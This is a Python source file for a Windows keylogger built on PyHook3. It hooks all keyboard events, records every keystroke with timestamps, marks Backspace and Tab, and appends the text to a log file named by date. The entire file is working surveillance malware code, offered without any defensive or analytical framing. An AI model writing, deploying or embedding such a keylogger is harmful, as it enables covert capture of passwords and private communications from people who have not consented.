import PyHook3
import pythoncom
from datetime import datetime




# Define a new function for the keylogger


def OnKeyboardEvent(event):
    datelogname = datetime.today().strftime('%m-%d-%Y')  # to be used for naming the log with the date in it.
    datetimestamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')  # to be used for timestamping the date and time the keys were stamped


    logfile = open( datelogname + 'logfile.txt', 'a+')   # open the file  in append mode. If the file does not exist, then create the file and open it in append mode.
    buffers = logfile.read()  # buffers is set to open the file and read what is  in it.
    logfile.close()  # closes the log file.

  # open the file to write the current new keystrokes.

    logfile = open(datelogname + "logfile.txt", 'a+')  # open the file  in append mode. If the file does not exist, then create the file and open it in append mode.
    #windowname = event.WindowName  # prints out the name of the current window being typed in.
    keylogs = chr(event.Ascii)  # keylogs is whatever is being typed.

    print("Ascii value is: ", str(event.Ascii))
    # print("current window being typed in " + windowname)

    if event.Ascii == 13:  # if entered is pressed, then start a new line and add the current date and time next to it.
      keylogs = '\n' + datetimestamp + " "

    if event.Ascii == 8:  # if backspace is used, then convert it to the word, back space. This is done to prevent it from showing up as a box.
      keylogs =' <Backspace> '

    if event.Ascii == 9:
     keylogs =' <Tab> '



    buffers += keylogs


    logfile.write(buffers)
  #logfile.write(chr(8))
  #logfile.write(chr(32))
  #logfile.write(chr(121))
  #logfile.write(chr(109))






    logfile.close()
    return True


hm = PyHook3.HookManager()


#hook keyboard
hm.KeyDown = OnKeyboardEvent   # watch for all keyboard events
hm.HookKeyboard()

pythoncom.PumpMessages()




